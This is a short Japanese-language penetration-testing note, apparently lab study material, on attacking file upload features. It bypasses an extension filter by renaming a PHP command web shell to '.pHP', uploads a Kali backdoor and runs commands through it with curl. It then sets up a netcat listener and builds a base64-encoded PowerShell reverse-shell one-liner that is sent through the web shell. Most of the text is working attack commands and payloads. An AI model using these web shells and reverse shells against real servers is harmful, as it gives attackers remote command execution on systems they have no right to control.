# 手順
## 例１アップロードできるファイル種別の列挙
1. ブラウザ上でファイルアップロードできる箇所を確認する

2.  テストファイルを作成し、アップロードできるもの、できないものを確認する
```bash
echo "this is a test" > test.txt

# 通常このファイルはアップロード時にエラーになる
echo "<?php system($_GET['cmd']);?>" > test.php
```

3.  拡張子を大文字に変更し、アップロードを試行
```bash
mv test.php test.pHP
```
4. アップロードできればフィルターを回避できたことになる
## 例2 コマンド実行ファイルのアップロード
1. 例１の結果からリバースシェル用のphpファイルを準備しアップロード
```bash
cp /usr/share/webshells/php/simple-backdoor.php ./
# このファイルをアップロード
```

2. 実行
```bash
curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
```

## 例3 Webシェル
1. 対象の拡張子を選択（ここでは.phpだが.aspなどの場合もある）
```bash
ls -la /usr/share/webshells
```
1. 例１の結果からリバースシェル用のphpファイルを準備しアップロード
```bash
cp /usr/share/webshells/php/simple-backdoor.php ./
# このファイルをアップロード
```

3. Netcatの準備
```bash
nc -nlvp 4444
```

4. Powershellワンライナーでリバースシェルを実行
```bash
# Powershellの起動
pwsh
```

```powershell
# ワンライナーの作成
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.50.189",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

$EncodedText =[Convert]::ToBase64String($Bytes)

$EncodedText

exit
```
5. 実行
```bash
# 以下の行に上記で生成したbase64文字列をくっつけて送信
# curl http://mountaindesserts.com/meteor/uploads/simple-backdoor.pHP?cmd=powrshell%20-enc%20

curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```